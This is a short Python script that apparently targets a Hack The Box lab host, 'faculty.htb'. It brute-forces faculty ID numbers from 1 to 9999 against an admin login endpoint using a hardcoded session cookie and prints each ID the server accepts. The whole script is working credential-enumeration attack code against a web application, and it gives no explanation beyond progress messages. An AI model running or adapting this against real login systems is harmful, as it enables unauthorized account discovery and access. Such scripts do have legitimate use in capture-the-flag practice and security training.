import requests

URL = "http://faculty.htb"

phpcookies = {"PHPSESSID":"p8puot3fnvvqksksq5e17ejnhn"}

print("[+] Running...")

for i in range(1,10000):

    if ( not (i % 1000) ):
        print(f"Current i: {i}")
    idData = {"id_no":i}
    if ( requests.post(URL + "/admin/ajax.php?action=login_faculty", cookies=phpcookies, data=idData ).text ) != "3":
        print(f"[!] Found Valid ID!: {i}")